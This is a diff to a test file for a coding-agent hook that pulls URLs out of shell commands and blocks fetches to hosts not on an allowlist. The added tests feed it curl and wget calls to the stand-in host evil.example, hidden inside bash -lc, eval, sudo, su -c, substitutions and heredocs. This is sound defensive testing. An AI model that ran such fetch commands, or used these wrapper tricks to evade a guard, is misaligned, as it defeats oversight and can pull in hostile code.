@@ -3,6 +3,7 @@ import type { Engine } from 'claude-code/testing'
 import type { On } from 'claude-code'
 
 import { hostOf, matchesAny, parseEntry, parseList, urlsInCommand } from '../hooks/hosts'
+import { fakeHub } from './hub'
 
 type Seen = { reached: string[]; toasts: string[]; registered: string[] }
 
@@ -157,4 +158,35 @@ test('host parsing, entries and matching', () => {
   expect(matchesAny('xc.com', ['c.com'])).toBe(false)
   expect(matchesAny('c.com', ['*.c.com'])).toBe(false)
   expect(urlsInCommand(`FOO=1 curl -H 'X: y' "https://a.com/x?y=1" -o out.txt; wget --url=nope`)).toEqual(['https://a.com/x?y=1'])
+})
+
+test('regression: URLs behind bash -lc, sh -ec, eval and wrappers with options are found', () => {
+  expect(urlsInCommand('bash -lc "curl https://evil.example/x"')).toEqual(['https://evil.example/x'])
+  expect(urlsInCommand("sh -ec 'cd /tmp && wget https://evil.example/y'")).toEqual(['https://evil.example/y'])
+  expect(urlsInCommand(`eval 'curl https://evil.example/z'`)).toEqual(['https://evil.example/z'])
+  expect(urlsInCommand('nice -n 5 curl https://evil.example/a')).toEqual(['https://evil.example/a'])
+  expect(urlsInCommand('timeout -s KILL 30 curl https://evil.example/b')).toEqual(['https://evil.example/b'])
+  expect(urlsInCommand('sudo -n -E curl https://evil.example/c')).toEqual(['https://evil.example/c'])
+  expect(urlsInCommand('env -u PROXY X=1 wget https://evil.example/d')).toEqual(['https://evil.example/d'])
+  expect(urlsInCommand('bash ./fetch.sh https://evil.example/e')).toEqual([])
+  // The shared shell reader: su -c, substitutions, heredocs fed to a shell, xargs; a heredoc note is only text.
+  expect(urlsInCommand(`su -c 'curl https://evil.example/f' me`)).toEqual(['https://evil.example/f'])
+  expect(urlsInCommand('echo "$(curl -s https://evil.example/g)"')).toEqual(['https://evil.example/g'])
+  expect(urlsInCommand('bash <<EOF\nwget https://evil.example/h\nEOF')).toEqual(['https://evil.example/h'])
+  expect(urlsInCommand('echo x | xargs -n 1 curl https://evil.example/i')).toEqual(['https://evil.example/i'])
+  expect(urlsInCommand("cat <<'EOF' > notes.md\ncurl https://evil.example/j\nEOF")).toEqual([])
+})
+
+test('with mods-hub: a block is published as risk.blocked and the note goes through the hub', async ($, on) => {
+  const seen = engine(on)
+  const hub = fakeHub(on)
+  await $.session.start({ cwd: '/work', surface: 'terminal', isInteractive: true })
+  expect(hub.hellos).toEqual([{ version: 'unknown', publishes: ['risk.blocked'], consumes: [] }])
+  expect((await fetch($, 'https://example.com/page')).deny).toContain('url-allowlist')
+  expect((await fetch($, 'https://github.com/a/b')).deny).toBeUndefined()
+  expect(hub.published).toEqual([
+    { topic: 'risk.blocked', data: { guard: 'url-allowlist', tool: 'WebFetch', reason: 'not-allowed: example.com is not on the allowlist', severity: 'medium', path: 'https://example.com/page' } },
+  ])
+  expect(hub.notified).toEqual([{ level: 'warning', title: 'blocked fetch from example.com. /allow-host example.com allows it for this session', topic: 'risk.blocked' }])
+  expect(seen.toasts).toEqual([])
 })
